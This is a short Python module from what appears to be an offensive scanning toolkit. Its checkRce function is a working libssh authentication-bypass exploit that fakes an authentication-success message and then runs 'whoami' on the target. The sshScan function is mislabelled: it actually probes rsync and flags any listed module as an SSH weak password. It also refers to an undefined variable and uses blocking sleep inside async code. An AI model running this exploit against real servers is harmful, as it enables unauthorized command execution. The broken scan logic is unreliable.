# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-02 22:05
import paramiko as paramiko
from colorama import Fore
from tqdm import tqdm

from exploit.service.base import *


async def checkRce(addr):
    try:
        sock = socket.socket()
        sock.settimeout(6)
        sock.connect((addr.split(':')[0], int(addr.split(':')[1])))
        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
        spawncmd = transport.open_session(timeout=6)
        spawncmd.exec_command("whoami")
        if spawncmd.recv_exit_status() == 0:
            tqdm.write(Fore.RED + '[+] Target maybe support libssh bypass, {}'.format(addr))

    except:
        pass


async def sshScan(addr, pbar):
    vulList = []
    try:
        s = socket.socket()
        s.connect((addr.split(':')[0], int(addr.split(':')[1])))
        s.send(b"@RSYNCD: 31\n")
        s.send(b'\n')
        time.sleep(0.5)
        result = s.recv(1024)
        if result:
            for path_name in re.split('\n', result.decode()):
                if path_name and not path_name.startswith('@RSYNCD: '):
                    vulList.append({'name': 'weakpass', 'url': addr, 'software': 'ssh'})

    except:
        pass
    finally:
        try:
            writer.close()
        except NameError:
            pass
    return vulList
